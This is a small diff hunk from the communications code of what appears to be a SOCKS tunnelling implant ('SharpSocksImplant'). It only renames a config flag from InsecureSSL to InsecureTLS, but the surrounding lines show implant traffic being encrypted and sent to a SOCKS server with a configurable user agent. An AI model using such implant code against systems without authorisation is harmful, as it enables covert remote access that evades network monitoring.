@@ -44,7 +44,7 @@ namespace SharpSocksImplant.Comms
                 : $"[{targetId}][Implant -> SOCKS Server] Sending {payload.Count} bytes");
             var encryptedSessionPayload = _encryption.Encrypt(Encoding.UTF8.GetBytes($"{targetId}:{status}").ToList());
             var cookieContainer = new CookieContainer();
-            var webClientEx = new WebClientEx(cookieContainer, _config.InsecureSSL)
+            var webClientEx = new WebClientEx(cookieContainer, _config.InsecureTLS)
             {
                 UserAgent = _config.UserAgent
             };
